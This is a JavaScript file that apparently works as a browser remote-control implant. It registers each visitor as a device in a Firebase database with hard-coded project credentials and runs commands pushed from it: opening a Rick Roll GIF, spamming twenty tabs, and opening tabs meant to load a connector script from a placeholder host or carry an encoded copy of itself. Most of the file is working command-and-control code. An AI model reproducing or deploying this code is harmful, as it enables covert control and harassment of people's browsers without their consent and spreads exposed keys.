(async () => {
  const deviceId = 'dev_' + Math.random().toString(36).substring(2, 10);

  // Load Firebase SDK
  const loadFirebase = async () => {
    const script1 = document.createElement('script');
    script1.src = 'https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js';
    document.head.appendChild(script1);
    await new Promise(res => script1.onload = res);

    const script2 = document.createElement('script');
    script2.src = 'https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js';
    document.head.appendChild(script2);
    await new Promise(res => script2.onload = res);
  };

  await loadFirebase();

  // Firebase config
  const firebaseConfig = {
    apiKey: "AIzaSyD5hBBFtSWYOMIk1ZeLqcUKsAubdok4FWk",
    authDomain: "nebcasino-5aca1.firebaseapp.com",
    databaseURL: "https://nebcasino-5aca1-default-rtdb.firebaseio.com",
    projectId: "nebcasino-5aca1",
    storageBucket: "nebcasino-5aca1.appspot.com",
    messagingSenderId: "907673467348",
    appId: "1:907673467348:web:37b0bcbad757f95845fe41"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();
  const devRef = db.ref(`sessions/public/devices/${deviceId}`);

  // Track status
  const updateStatus = () => devRef.update({ online: true, lastSeen: Date.now() });
  updateStatus();
  setInterval(updateStatus, 60000);
  window.addEventListener("beforeunload", () => devRef.update({ online: false, lastSeen: Date.now() }));
  devRef.onDisconnect().update({ online: false, lastSeen: Date.now() });

  // Listen for remote actions
  devRef.child('action').on('value', snap => {
    const action = snap.val();
    if (!action) return;

    // Show Rick Roll GIF
    if (action === 'rickroll') {
        window.open("https://www.gifcen.com/wp-content/uploads/2022/11/rick-roll-gif-7.gif", "_blank");
    }

    // Open spam tabs
    if (action === 'tabs') {
      for (let i = 0; i < 20; i++) {
        window.open("https://www.google.com/?safe=active&ssui=on", "_blank");
      }
    }

if (action.type === "injectTabWithScript" && action.url) {
  const newWin = window.open(action.url, "_blank");
  if (newWin) {
    const script = newWin.document.createElement("script");
    script.src = "https://yourdomain.com/connector.js"; // Replace with your hosted connector script URL
    newWin.onload = () => {
      newWin.document.head.appendChild(script);
    };
  }
}



    // Open remote tab + inject connector
    if (typeof action === "object" && action.type === "injectTab" && action.url) {
      const injectionScript = encodeURIComponent(`
        (async () => {
          const deviceId = 'dev_' + Math.random().toString(36).substring(2, 10);
          const loadFirebase = async () => {
            const s1 = document.createElement('script');
            s1.src = 'https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js';
            document.head.appendChild(s1);
            await new Promise(res => s1.onload = res);
            const s2 = document.createElement('script');
            s2.src = 'https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js';
            document.head.appendChild(s2);
            await new Promise(res => s2.onload = res);
          };
          await loadFirebase();
          const firebaseConfig = {
            apiKey: "AIzaSyD5hBBFtSWYOMIk1ZeLqcUKsAubdok4FWk",
            authDomain: "nebcasino-5aca1.firebaseapp.com",
            databaseURL: "https://nebcasino-5aca1-default-rtdb.firebaseio.com",
            projectId: "nebcasino-5aca1",
            storageBucket: "nebcasino-5aca1.appspot.com",
            messagingSenderId: "907673467348",
            appId: "1:907673467348:web:37b0bcbad757f95845fe41"
          };
          firebase.initializeApp(firebaseConfig);
          const db = firebase.database();
          const ref = db.ref('sessions/public/devices/' + deviceId);
          const update = () => ref.update({ online: true, lastSeen: Date.now() });
          update(); setInterval(update, 60000);
          window.addEventListener("beforeunload", () => ref.update({ online: false, lastSeen: Date.now() }));
          ref.onDisconnect().update({ online: false, lastSeen: Date.now() });
          ref.child('action').on('value', () => {});
        })();
      `);

      const fullURL = `${action.url}#inject=${injectionScript}`;
      window.open(fullURL, '_blank');
    }

    devRef.child('action').set(null);
  });
})();



